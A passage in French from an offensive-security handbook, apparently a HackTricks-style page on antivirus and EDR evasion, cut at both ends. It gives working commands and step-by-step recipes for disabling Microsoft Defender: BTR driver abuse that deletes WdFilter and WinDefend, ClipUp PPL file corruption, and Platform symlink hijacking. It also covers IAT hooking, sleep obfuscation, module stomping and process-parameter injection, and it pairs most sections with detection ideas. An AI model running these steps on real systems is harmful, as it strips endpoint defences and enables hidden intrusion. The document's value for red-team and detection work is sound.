Defender dépose normalement la ressource sous la forme d'un fichier aléatoire `[a-z]{8}.sys` et enregistre un service noyau portant un nom similaire. `DriverEntry` lit la valeur `Args` du service, ouvre le flux de données alternatif NTFS (ADS) référencé, déchiffre et valide la liste d'actions, écrit les informations de retour, puis renvoie `0xC0000056` (`STATUS_DELETE_PENDING`) après l'exécution réussie afin que le pilote se décharge au lieu de rester résident. Un service falsifié présente les valeurs caractéristiques suivantes.<sup>[[36]](#references)[[37]](#references)</sup>

```text
Type         = 1
Start        = 1
ErrorControl = 0
ImagePath    = \??\C:\Windows\System32\drivers\<random>.sys
Group        = Boot Bus Extender
Args         = C:\Windows\System32\drivers\<random>.sys:changelist
```

Le flux `:changelist` contient un blob chiffré avec RC4. Les builds analysés réutilisent une clé fixe de 256 octets ; le chiffrement ne constitue donc pas une frontière d’autorisation. Un texte en clair valide comporte un en-tête global de 24 octets (`Magic=0xFEE1DEAD`, `Version=2`, `PayloadOffset=0x10`, CRC de l’en-tête et identifiant de transaction dérivé du payload), suivi d’un chemin de feedback UTF-16 terminé par un caractère nul, puis d’un nombre quelconque d’éléments. Chaque élément comporte un en-tête de 16 octets (`DataSize`, `Action`, `HeaderCRC`, `DataCRC`), suivi de données propres à l’action et se terminant par **exactement quatre octets NUL**. Chaque région d’en-tête et de données est vérifiée indépendamment avec CRC-32, polynôme `0xEDB88320`, état initial `0xFFFFFFFF` et **sans XOR final** (`~CRC32`) ; l’état du CRC est réinitialisé pour chaque région.<sup>[[36]](#references)[[37]](#references)</sup>

Les ID d’action acceptés exposent ces primitives du noyau.<sup>[[36]](#references)[[37]](#references)</sup>

| ID | Données de l’élément | Résultat |
| --- | --- | --- |
| 1 | `[chemin UTF-16]` | Supprimer un fichier, y compris s’il est verrouillé |
| 2 | `[chemin UTF-16]` | Supprimer un répertoire vide |
| 3 | `[Flags][source][destination]` | Déplacer un fichier vers un chemin protégé choisi par l’attaquant ; une destination vide entraîne sa suppression |
| 4 | `[Flags][chemin de clé]` | Supprimer récursivement une clé de registre |
| 5 | `[Flags][chemin de clé + "\\" + valeur]` | Supprimer une valeur de registre |
| 6 | `[Flags][type][taille][chemin de clé + "\\" + valeur][données]` | Créer/mettre à jour une valeur de registre et créer les chemins de clé manquants |

Pour les actions 5 et 6, le séparateur clé/valeur sur le fil est constitué de **deux barres obliques inverses consécutives** ; un chemin formaté de manière conventionnelle ne sera pas correctement découpé. Le fichier de feedback reflète en grande partie la requête, mais les quatre premiers octets de données de chaque élément deviennent son `NTSTATUS` résultant. Pour les actions 1 et 2, qui ne comportent pas de champ initial `Flags`, BTR décale le chemin dans les quatre octets réservés de fin pour faire de la place à ce statut.<sup>[[36]](#references)</sup>

### Flux de travail de `BTR_CLI` et fenêtre de démarrage précoce

[`BTR_CLI`](https://github.com/Dump-GUY/BTR_CLI) implémente toute la chaîne : extraire `BTR.sys` de Defender local, créer `<random>.sys:changelist` et un flux de feedback, sérialiser et calculer les sommes de contrôle des actions chaînées, créer directement la clé de registre du service, puis appeler `NtLoadDriver` pour `-trigger now` ou laisser le pilote démarrer avec le système pour `-trigger boot`. La préparation directe du registre évite le chemin normal `CreateServiceW` du SCM et ne génère donc **pas** l’événement 7045 d’installation de service. Les artefacts déclenchés au démarrage peuvent ensuite être supprimés avec `BTR_CLI.exe -cleanup <service_name>`.<sup>[[36]](#references)[[37]](#references)</sup>

```powershell
# Runtime: remove protected security-service registrations from Ring 0
BTR_CLI.exe -chain -item "4|HKLM\SYSTEM\CurrentControlSet\Services\WdFilter" -item "4|HKLM\SYSTEM\CurrentControlSet\Services\WinDefend" -trigger now

# Boot: delete a security driver before its user-mode protection stack starts
BTR_CLI.exe -a 1 -s "C:\Windows\System32\drivers\wd\WdFilter.sys" -trigger boot
```

`Start=0` n’est pas utilisable, car BTR effectue des opérations d’E/S sur les fichiers depuis `DriverEntry`, avant que la pile de stockage et le lien `SystemRoot` soient prêts. `Start=1`, associé au groupe prioritaire `Boot Bus Extender`, s’exécute plutôt en phase 1 : NTFS est utilisable, mais de nombreux pilotes de sécurité à démarrage système et services EDR en mode utilisateur ne sont pas encore initialisés. Les filtres à démarrage précoce, tels que `WdFilter`, peuvent déjà être chargés ; toutefois, BTR peut supprimer leurs fichiers binaires ou leur configuration de service avant le démarrage suivant, et supprimer les exécutables des services avant leur lancement par SCM. ELAM ne comble pas cette faille, car BTR s’exécute après l’évaluation des pilotes au démarrage et possède une signature Microsoft valide.<sup>[[36]](#references)</sup>

Plusieurs actions s’exécutent dans une même transaction. La PoC ajoute en tête l’Action 1 pour le chemin codé en dur `\SystemRoot\Temp\BootClean.log` : BTR crée ce journal, puis traite sa propre demande de suppression et l’efface avant de se décharger. Cela réduit les traces, tandis que le placement des retours dans `<random>.sys:<random>.dat` permet de supprimer le pilote et les deux flux simultanément.<sup>[[36]](#references)[[37]](#references)</sup>

### Corrélations de détection à fort signal

Les règles fondées uniquement sur les signatures et la liste de blocage des pilotes vulnérables de Microsoft ne couvrent pas les abus des fonctionnalités prévues de BTR. Privilégiez les corrélations comportementales suivantes, tout en distinguant une lignée Defender légitime d’un lanceur quelconque.<sup>[[36]](#references)</sup>

- **Sysmon 15 :** la création de `.sys:changelist` est universelle lors de la préparation de BTR. Un flux ADS `.dat` associé au même `.sys` est particulièrement suspect, car Defender place normalement ses retours sous `C:\ProgramData\Microsoft\Windows Defender\Scans\RebootActions\`.
- **Sysmon 12/13 sans System 7045 :** corrélez la création directe de `HKLM\SYSTEM\CurrentControlSet\Services\<random>` contenant `Args=...:changelist` et `Group=Boot Bus Extender` à l’absence d’événement d’installation SCM correspondant.
- **Sysmon 6 -> 23 :** corrélez le chargement d’un pilote BTR connu, provenant d’une lignée autre que Defender, avec une suppression de fichier ultérieure attribuée à `System`/PID 4, en particulier pour les binaires de sécurité.
- **Sysmon 11 -> 23 :** déclenchez une alerte en cas de création et de suppression rapides de `\SystemRoot\Temp\BootClean.log` par `System`/PID 4.
- Restreignez et auditez l’attribution et l’activation de `SeLoadDriverPrivilege` ; une signature Microsoft ne suffit pas à établir la confiance lorsqu’un pilote d’outil de sécurité est préparé par `cmd.exe`, PowerShell ou un processus inconnu.

## Abus de Protected Process Light (PPL) pour altérer un antivirus/EDR avec des LOLBINs

Protected Process Light (PPL) applique une hiérarchie de signataires et de niveaux, de sorte que seuls les processus protégés de niveau égal ou supérieur peuvent altérer d’autres processus protégés. Du point de vue offensif, si vous pouvez lancer légitimement un binaire compatible PPL et contrôler ses arguments, vous pouvez détourner une fonctionnalité bénigne (par exemple, la journalisation) pour en faire une primitive d’écriture encadrée par PPL dans les répertoires protégés utilisés par les antivirus/EDR.<sup>[[16]](#references)[[17]](#references)[[18]](#references)[[19]](#references)[[20]](#references)</sup>

Ce qui permet à un processus de s’exécuter en tant que PPL
- Le fichier EXE cible (et toutes les DLL chargées) doit être signé avec un EKU compatible PPL.
- Le processus doit être créé avec CreateProcess à l’aide des indicateurs : `EXTENDED_STARTUPINFO_PRESENT | CREATE_PROTECTED_PROCESS`.
- Il faut demander un niveau de protection compatible avec le signataire du binaire (par exemple, `PROTECTION_LEVEL_ANTIMALWARE_LIGHT` pour les signataires anti-malware, `PROTECTION_LEVEL_WINDOWS` pour les signataires Windows). Un niveau incorrect entraîne l’échec de la création.

Voir également cette introduction plus générale à PP/PPL et à la protection de LSASS :

{{#ref}}
stealing-credentials/credentials-protections.md
{{#endref}}

Outils de lancement
- Outil auxiliaire open source : CreateProcessAsPPL (sélectionne le niveau de protection et transmet les arguments au fichier EXE cible) :
  - [https://github.com/2x7EQ13/CreateProcessAsPPL](https://github.com/2x7EQ13/CreateProcessAsPPL)<sup>[[19]](#references)</sup>
- Schéma d’utilisation :

```text
CreateProcessAsPPL.exe <level 0..4> <path-to-ppl-capable-exe> [args...]
# example: spawn a Windows-signed component at PPL level 1 (Windows)
CreateProcessAsPPL.exe 1 C:\Windows\System32\ClipUp.exe <args>
# example: spawn an anti-malware signed component at level 3
CreateProcessAsPPL.exe 3 <anti-malware-signed-exe> <args>
```

LOLBIN primitive : ClipUp.exe
- Le binaire système signé `C:\Windows\System32\ClipUp.exe` se lance lui-même et accepte un paramètre permettant d’écrire un fichier journal dans un chemin spécifié par l’appelant.
- Lorsqu’il est lancé en tant que processus PPL, l’écriture du fichier est effectuée avec les privilèges PPL.
- ClipUp ne peut pas analyser les chemins contenant des espaces ; utilisez les chemins courts 8.3 pour cibler des emplacements normalement protégés.

Helpers pour les chemins courts 8.3
- Lister les noms courts : `dir /x` dans chaque répertoire parent.
- Déduire un chemin court dans cmd : `for %A in ("C:\ProgramData\Microsoft\Windows Defender\Platform") do @echo %~sA`

Chaîne d’abus (abstraite)
1) Lancer le LOLBIN compatible PPL (ClipUp) avec `CREATE_PROTECTED_PROCESS` à l’aide d’un lanceur (par exemple, CreateProcessAsPPL).
2) Passer l’argument du chemin de journal de ClipUp pour forcer la création d’un fichier dans un répertoire AV protégé (par exemple, Defender Platform). Utilisez des noms courts 8.3 si nécessaire.
3) Si le binaire cible est normalement ouvert/verrouillé par l’AV pendant son exécution (par exemple, MsMpEng.exe), planifier l’écriture au démarrage, avant le lancement de l’AV, en installant un service à démarrage automatique qui s’exécute de manière fiable plus tôt. Vérifier l’ordre de démarrage avec Process Monitor (journalisation au démarrage).
4) Au redémarrage, l’écriture effectuée avec les privilèges PPL a lieu avant que l’AV ne verrouille ses binaires, corrompant le fichier cible et empêchant le démarrage.

Exemple d’invocation (chemins masqués/raccourcis pour des raisons de sécurité) :

```text
# Run ClipUp as PPL at Windows signer level (1) and point its log to a protected folder using 8.3 names
CreateProcessAsPPL.exe 1 C:\Windows\System32\ClipUp.exe -ppl C:\PROGRA~3\MICROS~1\WINDOW~1\Platform\<ver>\samplew.dll
```

Notes et contraintes
- Vous ne pouvez pas contrôler le contenu écrit par ClipUp, seulement son emplacement ; cette primitive convient à la corruption plutôt qu’à l’injection précise de contenu.
- Nécessite des privilèges d’admin local/SYSTEM pour installer/démarrer un service, ainsi qu’une fenêtre de redémarrage.
- Le timing est essentiel : la cible ne doit pas être ouverte ; l’exécution au démarrage évite les verrous de fichiers.

Détections
- Création du processus `ClipUp.exe` avec des arguments inhabituels, en particulier lorsqu’il est lancé par des lanceurs non standards, au démarrage ou aux alentours.
- Nouveaux services configurés pour démarrer automatiquement des binaires suspects et démarrer systématiquement avant Defender/AV. Examinez la création/modification de services avant les échecs de démarrage de Defender.
- Surveillance de l’intégrité des fichiers des binaires/répertoires Platform de Defender ; créations/modifications inattendues de fichiers par des processus dotés d’indicateurs de processus protégé.
- Télémétrie ETW/EDR : recherchez les processus créés avec `CREATE_PROTECTED_PROCESS` et l’utilisation anormale de niveaux PPL par des binaires non liés à l’AV.

Mesures d’atténuation
- WDAC/Code Integrity : limitez les binaires signés autorisés à s’exécuter en tant que PPL et les processus parents autorisés ; bloquez l’invocation de ClipUp en dehors des contextes légitimes.
- Hygiène des services : limitez la création/modification de services à démarrage automatique et surveillez la manipulation de l’ordre de démarrage.
- Assurez-vous que la protection contre les falsifications de Defender et les protections de démarrage précoce sont activées ; examinez les erreurs de démarrage indiquant une corruption de binaire.
- Envisagez de désactiver la génération de noms courts 8.3 sur les volumes hébergeant les outils de sécurité si cela est compatible avec votre environnement (testez soigneusement).

## Falsification de Microsoft Defender via le détournement par symlink du dossier de version Platform

Windows Defender choisit la plateforme à partir de laquelle il s’exécute en énumérant les sous-dossiers de :
- `C:\ProgramData\Microsoft\Windows Defender\Platform\`

Il sélectionne le sous-dossier dont la chaîne de version est la plus élevée dans l’ordre lexicographique (par exemple, `4.18.25070.5-0`), puis démarre les processus du service Defender depuis ce dossier (en mettant à jour les chemins du service/registre en conséquence). Cette sélection fait confiance aux entrées de répertoire, y compris aux points d’analyse de répertoire (symlinks). Un administrateur peut exploiter cela pour rediriger Defender vers un chemin accessible en écriture par un attaquant et réaliser un DLL sideloading ou perturber le service.<sup>[[21]](#references)[[22]](#references)</sup>

Prérequis
- Administrateur local (nécessaire pour créer des répertoires/symlinks dans le dossier Platform)
- Possibilité de redémarrer ou de déclencher une nouvelle sélection de la plateforme Defender (redémarrage du service au démarrage)
- Outils intégrés uniquement requis (`mklink`)

Pourquoi cela fonctionne
- Defender bloque les écritures dans ses propres dossiers, mais sa sélection de plateforme fait confiance aux entrées de répertoire et choisit la version la plus élevée dans l’ordre lexicographique sans vérifier que la cible pointe vers un chemin protégé/de confiance.

Étapes (exemple)
1) Préparez un clone accessible en écriture du dossier de plateforme actuel, par exemple `C:\TMP\AV` :
```cmd
set SRC="C:\ProgramData\Microsoft\Windows Defender\Platform\4.18.25070.5-0"
set DST="C:\TMP\AV"
robocopy %SRC% %DST% /MIR
```
2) Créez dans Platform un lien symbolique vers un répertoire de version supérieure pointant vers votre dossier :
```cmd
mklink /D "C:\ProgramData\Microsoft\Windows Defender\Platform\5.18.25070.5-0" "C:\TMP\AV"
```
3) Sélection du déclencheur (redémarrage recommandé) :
```cmd
shutdown /r /t 0
```
4) Vérifiez que MsMpEng.exe (WinDefend) s’exécute depuis le chemin redirigé :
```powershell
Get-Process MsMpEng | Select-Object Id,Path
# or
wmic process where name='MsMpEng.exe' get ProcessId,ExecutablePath
```
Vous devriez observer le nouveau chemin du processus sous `C:\TMP\AV\` ainsi que la configuration du service/registre reflétant cet emplacement.

Options de post-exploitation
- DLL sideloading/exécution de code : Déposez/remplacez les DLL que Defender charge depuis son répertoire d’application pour exécuter du code dans les processus de Defender. Voir la section ci-dessus : [DLL Sideloading & Proxying](#dll-sideloading--proxying).
- Arrêt du service/déni de service : Supprimez le version-symlink afin qu’au prochain démarrage, le chemin configuré ne soit pas résolu et que Defender ne démarre pas :
```cmd
rmdir "C:\ProgramData\Microsoft\Windows Defender\Platform\5.18.25070.5-0"
```

> [!TIP]
> Notez que cette technique ne permet pas à elle seule une élévation de privilèges ; elle nécessite des droits d’administrateur.

## Hooking API/IAT + Call-Stack Spoofing avec PIC (style Crystal Kit)

Les équipes red team peuvent déplacer l’évasion à l’exécution de l’implant C2 vers le module cible lui-même en hookant sa Import Address Table (IAT) et en redirigeant certaines API vers du code indépendant de la position (PIC) contrôlé par l’attaquant. Cette approche étend l’évasion au-delà de la petite surface d’API exposée par de nombreux kits (par exemple, CreateProcessA) et applique les mêmes protections aux BOF et aux DLL de post-exploitation.<sup>[[3]](#references)[[4]](#references)[[5]](#references)</sup>

Approche générale
- Charger un blob PIC aux côtés du module cible à l’aide d’un reflective loader (préfixé ou compagnon). Le PIC doit être autonome et indépendant de la position.
- Au chargement de la DLL hôte, parcourir son IMAGE_IMPORT_DESCRIPTOR et modifier les entrées de l’IAT des imports ciblés (par exemple, CreateProcessA/W, CreateThread, LoadLibraryA/W, VirtualAlloc) pour qu’elles pointent vers de minces wrappers PIC.
- Chaque wrapper PIC applique les techniques d’évasion avant de faire un tail-call vers l’adresse de la véritable API. Les techniques d’évasion habituelles incluent :
  - Masquer/démasquer la mémoire autour de l’appel (par exemple, chiffrer les régions du beacon, passer de RWX à RX, modifier les noms/permissions des pages), puis restaurer l’état après l’appel.
  - Call-Stack Spoofing : construire une pile bénigne et effectuer une transition vers l’API cible afin que l’analyse de la pile d’appels retrouve les frames attendues.<sup>[[9]](#references)</sup>
- Pour assurer la compatibilité, exporter une interface permettant à un script Aggressor (ou équivalent) d’enregistrer les API à hooker pour Beacon, les BOF et les DLL de post-exploitation.

Pourquoi utiliser le hooking IAT ici
- Fonctionne avec tout code utilisant l’import hooké, sans modifier le code de l’outil ni compter sur Beacon pour proxyfier des API spécifiques.
- Couvre les DLL de post-exploitation : hooker LoadLibrary* permet d’intercepter le chargement de modules (par exemple, System.Management.Automation.dll, clr.dll) et d’appliquer les mêmes techniques de masquage et d’évasion de pile à leurs appels d’API.
- Rétablit l’utilisation fiable des commandes de post-exploitation qui lancent des processus face aux détections fondées sur la pile d’appels, en wrapperant CreateProcessA/W.

Exemple minimal de hook IAT (pseudocode C/C++ x64)
```c
// For each IMAGE_IMPORT_DESCRIPTOR
//  For each thunk in the IAT
//    if imported function == "CreateProcessA"
//       WriteProcessMemory(local): IAT[idx] = (ULONG_PTR)Pic_CreateProcessA_Wrapper;
// Wrapper performs: mask(); stack_spoof_call(real_CreateProcessA, args...); unmask();
```
Notes
- Appliquez le patch après les relocations/ASLR et avant la première utilisation de l’import. Les loaders réfléchis comme TitanLdr/AceLdr montrent comment effectuer le hooking dans le DllMain du module chargé.
- Gardez les wrappers compacts et compatibles PIC ; résolvez la véritable API via la valeur IAT d’origine capturée avant le patch ou via LdrGetProcedureAddress.
- Utilisez des transitions RW → RX pour le PIC et évitez de laisser des pages accessibles en écriture et en exécution.

Stub de spoofing de la pile d’appels
- Les stubs PIC de type Draugr construisent une fausse chaîne d’appels (avec des adresses de retour dans des modules bénins), puis basculent vers la véritable API.
- Cela déjoue les détections qui s’attendent à trouver des piles canoniques issues de Beacon/BOFs lors d’appels à des API sensibles.
- Combinez cette technique avec le stack cutting/stack stitching pour atteindre les frames attendues avant le prologue de l’API.

Intégration opérationnelle
- Ajoutez le loader réfléchi au début des DLL post-ex afin que le PIC et les hooks s’initialisent automatiquement au chargement de la DLL.
- Utilisez un script Aggressor pour enregistrer les API cibles afin que Beacon et les BOFs bénéficient de la même méthode d’évasion en toute transparence, sans modification du code.

Considérations relatives à la détection et au DFIR
- Intégrité de l’IAT : entrées pointant vers des adresses qui ne font pas partie d’une image (heap/anon) ; vérification périodique des pointeurs d’importation.
- Anomalies de pile : adresses de retour n’appartenant pas aux images chargées ; transitions brusques vers du PIC hors image ; ascendance RtlUserThreadStart incohérente.
- Télémétrie du loader : écritures en processus dans l’IAT, activité précoce de DllMain qui modifie les thunks d’importation, régions RX inattendues créées au chargement.
- Évasion du chargement d’images : si vous hookez LoadLibrary*, surveillez les chargements suspects d’assemblies d’automatisation/clr corrélés à des événements de masquage mémoire.

Éléments et exemples connexes
- Loaders réfléchis qui effectuent le patching de l’IAT au chargement (p. ex., TitanLdr, AceLdr)
- Hooks de masquage mémoire (p. ex., simplehook) et PIC de stack cutting (stackcutting)
- Stubs PIC de spoofing de la pile d’appels (p. ex., Draugr)


## Hooks IAT au moment de l’importation + Sleep Obfuscation (Crystal Palace/PICO)

### Hooks IAT au moment de l’importation via un PICO résident

Si vous contrôlez un loader réfléchi, vous pouvez hooker les imports **pendant** `ProcessImports()` en remplaçant le pointeur `GetProcAddress` du loader par un résolveur personnalisé qui vérifie d’abord les hooks :<sup>[[6]](#references)[[7]](#references)[[8]](#references)</sup>

- Créez un **PICO résident** (objet PIC persistant) qui subsiste après la libération du PIC temporaire du loader.
- Exportez une fonction `setup_hooks()` qui remplace le résolveur d’importation du loader (p. ex., `funcs.GetProcAddress = _GetProcAddress`).
- Dans `_GetProcAddress`, ignorez les imports par ordinal et utilisez une recherche de hooks basée sur les hash, comme `__resolve_hook(ror13hash(name))`. Si un hook existe, renvoyez-le ; sinon, déléguez à la véritable fonction `GetProcAddress`.
- Enregistrez les cibles des hooks à l’édition des liens avec les entrées Crystal Palace `addhook "MODULE$Func" "hook"`. Le hook reste valide puisqu’il réside dans le PICO résident.

Cela permet la **redirection de l’IAT au moment de l’importation** sans patcher la section de code de la DLL chargée après son chargement.

### Forcer les imports hookables lorsque la cible utilise le parcours du PEB

Les hooks au moment de l’importation ne sont déclenchés que si la fonction figure réellement dans l’IAT de la cible. Si un module résout les API via un parcours du PEB et un hash (sans entrée d’importation), forcez un véritable import pour que le chemin `ProcessImports()` du loader le prenne en charge :

- Remplacez la résolution des exports par hash (p. ex., `GetSymbolAddress(..., HASH_FUNC_WAIT_FOR_SINGLE_OBJECT)`) par une référence directe comme `&WaitForSingleObject`.
- Le compilateur génère une entrée IAT, ce qui permet l’interception lorsque le loader réfléchi résout les imports.

### Obfuscation du sommeil/de l’inactivité de type Ekko sans patcher `Sleep()`

Au lieu de patcher `Sleep`, hookez les **primitives d’attente/IPC réellement utilisées** par l’implant (`WaitForSingleObject(Ex)`, `WaitForMultipleObjects`, `ConnectNamedPipe`). Pour les longues attentes, enveloppez l’appel dans une chaîne d’obfuscation de type Ekko qui chiffre l’image en mémoire pendant l’inactivité :<sup>[[31]](#references)[[27]](#references)</sup>

- Utilisez `CreateTimerQueueTimer` pour planifier une séquence de callbacks qui appellent `NtContinue` avec des frames `CONTEXT` préparées.
- Chaîne typique (x64) : définir l’image en `PAGE_READWRITE` → chiffrer avec RC4 via `advapi32!SystemFunction032` sur l’image mappée entière → effectuer l’attente bloquante → déchiffrer avec RC4 → **restaurer les permissions de chaque section** en parcourant les sections PE → signaler la fin.
- `RtlCaptureContext` fournit un modèle de `CONTEXT` ; clonez-le dans plusieurs frames et définissez les registres (`Rip/Rcx/Rdx/R8/R9`) pour appeler chaque étape.

Détail opérationnel : renvoyez « succès » pour les longues attentes (p. ex., `WAIT_OBJECT_0`) afin que l’appelant poursuive son exécution pendant que l’image est masquée. Ce schéma dissimule le module aux scanners pendant les périodes d’inactivité et évite la signature classique du « `Sleep()` patché ».

Idées de détection (basées sur la télémétrie)
- Rafales de callbacks `CreateTimerQueueTimer` pointant vers `NtContinue`.
- Utilisation de `advapi32!SystemFunction032` sur de grands buffers contigus de la taille d’une image.
- Appels à `VirtualProtect` sur de grandes plages, suivis d’une restauration personnalisée des permissions de chaque section.

### Enregistrement CFG à l’exécution pour les gadgets d’obfuscation du sommeil

Sur les cibles où CFG est activé, le premier saut indirect vers un gadget au milieu d’une fonction, tel que `jmp [rbx]` ou `jmp rdi`, provoque généralement le plantage du processus avec `STATUS_STACK_BUFFER_OVERRUN`, car le gadget ne figure pas dans les métadonnées CFG du module. Pour que les chaînes de type Ekko/Kraken fonctionnent dans des processus renforcés :<sup>[[30]](#references)</sup>

- Enregistrez chaque destination indirecte utilisée par la chaîne avec `NtSetInformationVirtualMemory(..., VmCfgCallTargetInformation, ...)` et des entrées `CFG_CALL_TARGET_VALID`.
- Pour les adresses à l’intérieur d’images chargées (`ntdll`, `kernel32`, `advapi32`), le `MEMORY_RANGE_ENTRY` doit commencer à la **base de l’image** et couvrir **la taille complète de l’image**.
- Pour les régions mappées manuellement/PIC/stomped, utilisez plutôt la **base d’allocation** et la taille d’allocation.
- Marquez non seulement le gadget de dispatch, mais aussi les exports atteints indirectement (`NtContinue`, `SystemFunction032`, `VirtualProtect`, `GetThreadContext`, `SetThreadContext`, les appels système d’attente/de signalement) et toutes les sections exécutables contrôlées par l’attaquant qui deviendront des cibles indirectes.

Cela transforme les chaînes de sommeil de type ROP/JOP, qui « ne fonctionnent que dans les processus sans CFG », en une primitive réutilisable pour `explorer.exe`, les navigateurs, `svchost.exe` et d’autres endpoints compilés avec `/guard:cf`.

### Spoofing de pile compatible CET pour les threads en sommeil

Le remplacement complet du `CONTEXT` est bruyant et peut échouer sur les systèmes CET Shadow Stack, car un `Rip` usurpé doit toujours correspondre à la pile fantôme matérielle. Un schéma de masquage du sommeil plus sûr consiste à :<sup>[[30]](#references)</sup>

- Choisir un autre thread du même processus et lire les limites de pile de son `NT_TIB` / TEB (`StackBase`, `StackLimit`) via `NtQueryInformationThread`.
- Sauvegarder le TEB/TIB réel du thread courant.
- Capturer le contexte réel du thread en sommeil avec `GetThreadContext`.
- Copier **uniquement** le `Rip` réel dans le contexte usurpé, en laissant le `Rsp` et l’état de pile usurpés intacts.
- Pendant la période de sommeil, copier le `NT_TIB` du thread usurpé dans le TEB courant afin que les parcours de pile se déroulent dans une plage de pile légitime.
- Une fois l’attente terminée, restaurer le TIB et le contexte d’origine du thread.

Cela préserve un pointeur d’instruction cohérent avec CET tout en induisant en erreur les parcours de pile des EDR qui se fient aux métadonnées de pile du TEB pour valider le déroulement de pile.

### Alternative basée sur les APC : Kraken Mask

Si le dispatch par file d’attente de timers est trop reconnaissable, la même séquence de sommeil-chiffrement-spoofing-restauration peut être exécutée depuis un thread auxiliaire suspendu à l’aide d’APC en file d’attente :<sup>[[27]](#references)</sup>

- Créez un thread auxiliaire ayant `NtTestAlert` comme point d’entrée.
- Mettez en file d’attente les frames `CONTEXT`/APC préparées avec `NtQueueApcThread` et exécutez-les avec `NtAlertResumeThread`.
- Stockez l’état de la chaîne sur le heap plutôt que sur la pile du thread auxiliaire, afin d’éviter d’épuiser la pile par défaut de 64 KB du thread.
- Utilisez `NtSignalAndWaitForSingleObject` pour signaler atomiquement l’événement de démarrage et bloquer.
- Suspendez le thread principal avant de restaurer le TIB/contexte (`NtSuspendThread` → restauration → `NtResumeThread`) afin de réduire la fenêtre de course pendant laquelle un scanner pourrait détecter une pile partiellement restaurée.

Cette méthode remplace la signature `CreateTimerQueueTimer` + `NtContinue` par une signature thread auxiliaire/APC tout en conservant les mêmes objectifs de masquage RC4 et de spoofing de pile.

Idées de détection supplémentaires
- `NtSetInformationVirtualMemory` avec `VmCfgCallTargetInformation` peu avant les périodes de sommeil, les attentes ou le dispatch d’APC.
- `GetThreadContext`/`SetThreadContext` autour de `WaitForSingleObject(Ex)`, `NtWaitForSingleObject`, `NtSignalAndWaitForSingleObject` ou `ConnectNamedPipe`.
- `NtQueryInformationThread` suivi d’écritures directes dans les limites de pile du TEB/TIB du thread courant.
- Chaînes `NtQueueApcThread`/`NtAlertResumeThread` qui atteignent indirectement `SystemFunction032`, `VirtualProtect` ou des helpers de restauration des permissions de section.
- Utilisation répétée de signatures de gadgets courtes telles que `FF 23` (`jmp [rbx]`) ou `FF E7` (`jmp rdi`) comme pivots de dispatch dans des modules signés.


## Module Stomping de précision

Le module stomping exécute des payloads depuis la **section `.text` d’une DLL déjà mappée dans le processus cible**, plutôt que d’allouer une mémoire exécutable privée évidente ou de charger une nouvelle DLL sacrificielle. La cible de l’écrasement doit être une **image chargée, adossée à un fichier sur disque**, dont l’espace de code peut accueillir le payload sans corrompre les chemins de code encore nécessaires au processus.<sup>[[1]](#references)[[2]](#references)</sup>

### Sélection fiable de la cible

Le stomping naïf de modules courants tels que `uxtheme.dll` ou `comctl32.dll` est fragile : la DLL peut ne pas être chargée dans le processus distant, et une région de code trop petite fera planter le processus. Une méthode plus fiable consiste à :

1. Énumérer les modules du processus cible et conserver une **liste d’inclusion contenant uniquement les noms** des DLL déjà chargées.
2. Construire d’abord le payload et relever sa **taille exacte en octets**.
3. Parcourir les DLL candidates sur disque et comparer la **`Misc_VirtualSize` de la section PE `.text`** à la taille du payload. C’est plus important que la taille du fichier, car cette valeur reflète la taille de la section exécutable **une fois mappée en mémoire**.
4. Analyser la **Export Address Table (EAT)** et choisir le RVA d’une fonction exportée comme offset de départ du stomp.
5. Calculer le **rayon d’impact** : si le payload dépasse les limites de la fonction sélectionnée, il écrasera les exports adjacents placés après elle en mémoire.

Exemples d’outils de reconnaissance/sélection observés dans la nature :

```cmd
list-process-dlls.exe -p <PID> -n -o c:\payloads\modules.txt
python find-stompable-dlls.py -d c:\Windows\System32 -i c:\payloads\modules.txt <payload_size>
python dump-exports.py -f <dll_path>
python blast-radius.py -f <dll_path> -fnc <export_name> -s <payload_size>
```

Notes opérationnelles
- Privilégiez les DLL **déjà chargées** dans le processus distant pour éviter la télémétrie associée à `LoadLibrary` et aux chargements d’images inattendus.
- Privilégiez les exports rarement exécutés par l’application cible ; sinon, des chemins de code normaux pourraient atteindre les octets écrasés avant ou après la création du thread.
- Les implants volumineux nécessitent souvent de remplacer l’intégration du shellcode sous forme de chaîne littérale par un **initialiseur de tableau d’octets/entre accolades**, afin que le tampon complet soit correctement représenté dans le code source de l’injecteur.

Pistes de détection
- Écritures distantes dans des pages exécutables adossées à une image (`MEM_IMAGE`, `PAGE_EXECUTE*`), plutôt que dans les allocations privées RWX/RX plus courantes.
- Points d’entrée d’export dont les octets en mémoire ne correspondent plus au fichier de référence sur disque.
- Threads distants ou pivots de contexte dont l’exécution commence dans un export de DLL légitime, dont les premiers octets ont été récemment modifiés.
- Séquences suspectes de `VirtualProtect(Ex)` / `WriteProcessMemory` ciblant des pages `.text` de DLL, suivies de la création d’un thread.

## Empoisonnement des paramètres de processus (P3)

Process Parameter Poisoning (P3) est une technique de **process-injection / EDR-evasion** qui évite le chemin classique d’écriture distante (`VirtualAllocEx` + `WriteProcessMemory`). Au lieu de copier des octets dans un processus cible déjà en cours d’exécution, elle exploite le fait que Windows **copie certains paramètres de démarrage de `CreateProcessW` dans le processus enfant** et les stocke dans `PEB->ProcessParameters` (`RTL_USER_PROCESS_PARAMETERS`).<sup>[[28]](#references)[[29]](#references)</sup>

### Données porteuses susceptibles d’être empoisonnées et copiées par `CreateProcessW`

Les données porteuses utiles sont :

- `lpCommandLine` → `RTL_USER_PROCESS_PARAMETERS.CommandLine`
- `lpEnvironment` (avec `CREATE_UNICODE_ENVIRONMENT`) → `RTL_USER_PROCESS_PARAMETERS.Environment`
- `STARTUPINFO.lpReserved` → `RTL_USER_PROCESS_PARAMETERS.ShellInfo`

Contraintes pratiques des données porteuses :

- `lpCommandLine` doit pointer vers une **mémoire accessible en écriture** pour `CreateProcessW` et est limité à **32 767 caractères Unicode**, terminateur nul compris.
- `lpEnvironment` doit être un bloc d’environnement Unicode composé de chaînes successives `NAME=VALUE\0`, terminées par un `\0` supplémentaire.
- `lpReserved` est officiellement réservé ; le mappage `ShellInfo` doit donc être considéré comme un détail d’implémentation, et non comme un contrat documenté stable.

La création normale d’un processus devient ainsi la **primitive de transfert de payload**. L’opérateur crée le processus enfant avec des données de démarrage contrôlées par l’attaquant et laisse Windows effectuer la copie interprocessus.

### Flux de recherche à distance sans API d’écriture distante

Après la création de l’enfant, localisez le tampon copié à l’aide de primitives **en lecture seule** :

1. `NtQueryInformationProcess(ProcessBasicInformation)` → obtenir `PROCESS_BASIC_INFORMATION.PebBaseAddress`
2. Lire le `PEB` distant
3. Suivre `PEB.ProcessParameters`
